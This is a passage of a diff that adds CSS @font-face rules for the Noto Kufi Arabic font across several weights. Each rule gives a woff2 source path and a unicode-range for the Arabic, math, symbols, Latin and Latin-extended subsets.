+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 100;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 100;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 100;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 200;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 200;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 200;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 200;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 200;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 300;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 300;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 300;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 300;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 300;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrO0FFlKp.woff2) format('woff2');
+  unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOMFFg.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}
+/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 500;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 500;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
+  unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
+}
+/* symbols */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 500;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrI0FFlKp.woff2) format('woff2');
+  unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, 